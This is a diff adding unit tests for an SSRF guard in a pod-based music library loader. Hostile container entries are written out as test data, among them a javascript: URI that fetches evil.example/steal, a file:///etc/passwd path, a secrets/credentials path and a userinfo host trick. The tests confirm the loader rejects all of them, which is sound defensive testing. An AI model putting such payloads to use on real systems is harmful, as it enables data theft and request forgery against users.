@@ -13,6 +13,7 @@ import {
   ensureTrailingSlash,
   iriTail,
   isAccessDenied,
+  isSafeContainedIri,
   kindLabel,
   LIBRARY_KINDS,
   loadLibrary,
@@ -185,6 +186,114 @@ describe("loadLibrary — child read failures", () => {
     }) as unknown as typeof globalThis.fetch;
     const store = new MusicStore({ base: BASE, fetch });
     await expect(loadLibrary(store, "tracks")).rejects.toSatisfy(isAccessDenied);
+  });
+});
+
+describe("loadLibrary — untrusted container listing (SSRF guard)", () => {
+  // A container that lists, alongside two legitimate in-pod children, three
+  // hostile `ldp:contains` objects: a javascript:-scheme URI, a cross-origin
+  // https host, and an out-of-pod (different container, same origin) path. Only
+  // the two real children must be fetched + listed; the hostile IRIs must never
+  // reach a readItem fetch.
+  const EVIL_JS = "javascript:fetch('https://evil.example/steal')";
+  const EVIL_CROSS_ORIGIN = "https://evil.example/tracks/pwn";
+  const EVIL_OUT_OF_POD = `${BASE}secrets/credentials`;
+  const HOSTILE_LISTING = `
+@prefix ldp: <http://www.w3.org/ns/ldp#> .
+<${TRACKS_CONTAINER}> a ldp:Container ;
+  ldp:contains <${T1}>, <${T2}>,
+    <${EVIL_JS}>,
+    <${EVIL_CROSS_ORIGIN}>,
+    <${EVIL_OUT_OF_POD}> .
+`;
+
+  /** routerFetch that records every requested URL so we can assert non-fetch. */
+  function recordingFetch(map: Record<string, string>): {
+    fetch: typeof globalThis.fetch;
+    requested: string[];
+  } {
+    const requested: string[] = [];
+    const fetch = (async (input: string | URL | Request) => {
+      const url = typeof input === "string" ? input : input.toString();
+      requested.push(url);
+      const body = map[url];
+      if (body === undefined) {
+        return new Response(null, { status: 404 });
+      }
+      return new Response(body, {
+        status: 200,
+        headers: { "content-type": "text/turtle", etag: '"v1"' },
+      });
+    }) as unknown as typeof globalThis.fetch;
+    return { fetch, requested };
+  }
+
+  it("never fetches a javascript:/cross-origin/out-of-pod child; lists only safe children", async () => {
+    const { fetch, requested } = recordingFetch({
+      [TRACKS_CONTAINER]: HOSTILE_LISTING,
+      [T1]: TRACK_1,
+      [T2]: TRACK_2_NO_NAME,
+    });
+    const store = new MusicStore({ base: BASE, fetch });
+    const items = await loadLibrary(store, "tracks");
+
+    // Only the two legitimate in-pod children are listed.
+    expect(items.map((i) => i.iri).sort()).toEqual([T2, T1].sort());
+
+    // The hostile IRIs were never the subject of a fetch (no readItem call).
+    expect(requested).not.toContain(EVIL_JS);
+    expect(requested).not.toContain(EVIL_CROSS_ORIGIN);
+    expect(requested).not.toContain(EVIL_OUT_OF_POD);
+    // Exactly the container + the two safe children were fetched.
+    expect(requested.sort()).toEqual([TRACKS_CONTAINER, T1, T2].sort());
+  });
+});
+
+describe("isSafeContainedIri", () => {
+  const container = TRACKS_CONTAINER; // https://alice.example/music/tracks/
+
+  it("accepts a real in-pod child under the container", () => {
+    expect(isSafeContainedIri(container, `${container}reverie`)).toBe(true);
+    expect(isSafeContainedIri(container, `${container}sub/nested`)).toBe(true);
+  });
+
+  it("rejects a non-http(s) scheme (javascript:/data:/file:/blob:)", () => {
+    expect(isSafeContainedIri(container, "javascript:alert(1)")).toBe(false);
+    expect(isSafeContainedIri(container, "data:text/plain,hi")).toBe(false);
+    expect(isSafeContainedIri(container, "file:///etc/passwd")).toBe(false);
+    expect(isSafeContainedIri(container, "blob:https://alice.example/x")).toBe(false);
+  });
+
+  it("rejects a cross-origin child even under a look-alike path", () => {
+    expect(isSafeContainedIri(container, "https://evil.example/music/tracks/pwn")).toBe(false);
+    // Userinfo trick: the real host is evil.example, not alice.example.
+    expect(isSafeContainedIri(container, "https://alice.example@evil.example/music/tracks/x")).toBe(
+      false,
+    );
+  });
+
+  it("rejects an out-of-pod path on the same origin (sibling/parent container)", () => {
+    expect(isSafeContainedIri(container, `${BASE}secrets/credentials`)).toBe(false);
+    expect(isSafeContainedIri(container, `${BASE}albums/x`)).toBe(false);
+    // A look-alike sibling whose path is a string-prefix of the container but is
+    // NOT under it (no slash boundary) must be rejected.
+    expect(isSafeContainedIri(container, `${BASE}tracks-evil/x`)).toBe(false);
+  });
+
+  it("rejects the container itself and a parent", () => {
+    expect(isSafeContainedIri(container, container)).toBe(false);
+    expect(isSafeContainedIri(container, BASE)).toBe(false);
+  });
+
+  it("rejects an unparseable child or container IRI", () => {
+    expect(isSafeContainedIri(container, "not a url")).toBe(false);
+    expect(isSafeContainedIri("also not a url", `${container}reverie`)).toBe(false);
+  });
+
+  it("treats a container IRI without a trailing slash as slash-terminated", () => {
+    const noSlash = "https://alice.example/music/tracks";
+    expect(isSafeContainedIri(noSlash, "https://alice.example/music/tracks/reverie")).toBe(true);
+    expect(isSafeContainedIri(noSlash, "https://alice.example/music/tracks")).toBe(false);
   });
 });
 
